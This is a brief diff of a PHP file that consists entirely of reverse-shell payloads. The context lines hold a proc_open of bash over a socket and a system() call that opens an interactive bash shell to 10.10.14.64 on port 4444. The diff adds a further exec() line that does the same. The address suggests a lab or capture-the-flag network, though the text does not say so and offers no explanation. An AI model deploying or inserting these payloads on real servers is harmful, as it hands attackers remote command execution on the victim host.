@@ -21,3 +21,5 @@ $proc = proc_open('/bin/bash', [0 => $sock, 1 => $sock, 2 => $sock], $pipes);
 ?>
 
 <?php system('bash -i >& /dev/tcp/10.10.14.64/4444 0>&1'); ?>
+
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.64/4444 0>&1'"); ?>
